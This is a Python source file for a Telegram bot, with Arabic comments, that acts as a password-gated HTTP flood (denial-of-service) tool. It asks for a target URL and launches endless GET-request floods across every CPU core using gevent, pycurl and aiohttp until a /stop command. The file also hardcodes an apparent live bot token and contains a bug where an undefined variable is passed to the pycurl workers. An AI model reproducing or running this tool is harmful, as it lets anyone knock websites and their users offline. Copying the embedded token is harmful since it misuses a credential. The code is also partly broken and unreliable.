
import telebot
import time
import multiprocessing
import requests
import httpx
import aiohttp
import pycurl
import asyncio
import gevent
from gevent import monkey
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO

# تفعيل التصحيح لخيوط الشبكة في gevent
monkey.patch_all()

# ضع رمز التوكن الخاص بك هنا
TOKEN = '7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go'
bot = telebot.TeleBot(TOKEN)

# متغير لتتبع حالة إيقاف الهجوم
stop_attack_flag = multiprocessing.Value('b', False)

def display_banner(chat_id):
    banner_text = "JUNAI"
    for char in banner_text:
        bot.send_message(chat_id, Fore.GREEN + char + Style.RESET_ALL)
        time.sleep(0.0)

def password_prompt(chat_id):
    bot.send_message(chat_id, "Enter password:")
    bot.register_next_step_handler_by_chat_id(chat_id, check_password)

def check_password(message):
    password = message.text
    if password == "junai":
        bot.send_message(message.chat.id, Fore.GREEN + "Correct password! Opening attack menu 0x7F6AD9F14371C6FB9678CA77..." + Style.RESET_ALL)
        start_attack(message.chat.id)
    else:
        bot.send_message(message.chat.id, Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)

def send_requests_gevent(target, stop_flag):
    def send_request():
        while not stop_flag.value:
            try:
                requests.get(target, timeout=5)
            except requests.exceptions.RequestException:
                pass

    jobs = [gevent.spawn(send_request) for _ in range(1500)]
    gevent.joinall(jobs)

async def send_requests_aiohttp(target, stop_flag):
    async with aiohttp.ClientSession() as session:
        while not stop_flag.value:
            try:
                async with session.get(target, timeout=5) as response:
                    await response.text()
            except aiohttp.ClientError:
                pass

def send_requests_pycurl(target, stop_flag):
    while not stop_flag.value:
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, target)
        c.setopt(c.WRITEDATA, buffer)
        try:
            c.perform()
        except pycurl.error:
            pass
        finally:
            c.close()

def show_attack_animation(chat_id):
    bot.send_message(chat_id, "Loading...")

def start_attack(chat_id):
    try:
        msg = bot.send_message(chat_id, "Target URL:")
        bot.register_next_step_handler(msg, get_target_details)
    except Exception:
        pass

def get_target_details(message):
    target = message.text
    msg = bot.send_message(message.chat.id, "Attack will continue indefinitely. Use /stop to end it.")
    execute_attack(message, target)

def execute_attack(message, target):
    total_cores = multiprocessing.cpu_count()

    bot.send_message(message.chat.id, f"Starting continuous attack on {target} using {total_cores} cores...")

    show_attack_animation(message.chat.id)
    bot.send_message(message.chat.id, "Start Attack")

    processes = []

    with stop_attack_flag.get_lock():
        stop_attack_flag.value = False

    try:
        for i in range(total_cores):
            process_gevent = multiprocessing.Process(target=send_requests_gevent, args=(target, stop_attack_flag))
            process_pycurl = multiprocessing.Process(target=send_requests_pycurl, args=(target, stop_flag))
            processes.extend([process_gevent, process_pycurl])
            process_gevent.start()
            process_pycurl.start()

        # تشغيل الجزء غير المتزامن في الخيط الرئيسي
        asyncio.run(send_requests_aiohttp(target, stop_attack_flag))

        for process in processes:
            process.join()

    except Exception:
        pass

@bot.message_handler(commands=['start'])
def handle_start(message):
    display_banner(message.chat.id)
    password_prompt(message.chat.id)

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    with stop_attack_flag.get_lock():
        stop_attack_flag.value = True
    bot.send_message(message.chat.id, "Stop command received. Stopping attack...")

def main():
    try:
        bot.polling(none_stop=True)
    except Exception:
        pass

if __name__ == "__main__":
    main()
